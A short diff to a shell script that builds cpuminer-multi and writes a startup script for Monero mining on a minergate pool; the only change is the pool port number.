@@ -14,7 +14,7 @@ else
     CFLAGS="-march=native" ./configure --with-crypto --with-curl
 fi
 make clean && make;
-printf "#!/bin/sh\n/root/cpuminer-multi/cpuminer -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u im@tung.pro -p x --thread=`eval grep -c ^processor /proc/cpuinfo`" > /root/miner.sh;
+printf "#!/bin/sh\n/root/cpuminer-multi/cpuminer -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45700 -u im@tung.pro -p x --thread=`eval grep -c ^processor /proc/cpuinfo`" > /root/miner.sh;
 printf '
 #!/bin/sh
 
